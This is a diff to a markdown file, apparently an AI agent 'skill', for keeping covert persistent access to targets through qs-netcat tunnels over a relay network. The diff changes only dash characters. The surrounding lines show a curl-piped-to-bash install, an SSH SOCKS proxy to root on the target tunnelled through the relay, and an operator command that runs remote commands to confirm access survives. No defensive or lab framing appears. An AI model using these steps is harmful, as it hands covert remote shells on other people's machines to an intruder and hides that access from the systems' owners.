@@ -1,7 +1,7 @@
 # QSocket Covert Persistence Skill
 
 ## Overview
-Deploy, manage, and maintain persistent covert access to targets using QSocket (qs-netcat) encrypted tunnels through the QSRN relay network. No open ports required — both sides connect outbound.
+Deploy, manage, and maintain persistent covert access to targets using QSocket (qs-netcat) encrypted tunnels through the QSRN relay network. No open ports required - both sides connect outbound.
 
 ## Prerequisites
 - `qs-netcat` binary (install: `curl -fsSL qsocket.io/0 | bash`)
@@ -74,7 +74,7 @@ ssh -D 9090 -o ProxyCommand="qs-netcat -s ${SECRET}" root@qsocket
 
 ### 5. Verify Persistence
 ```bash
-# From operator side — attempt connection
+# From operator side - attempt connection
 timeout 10 qs-netcat -i -s "${SECRET}" -c "echo ALIVE; uname -a; whoami"
 ```
 
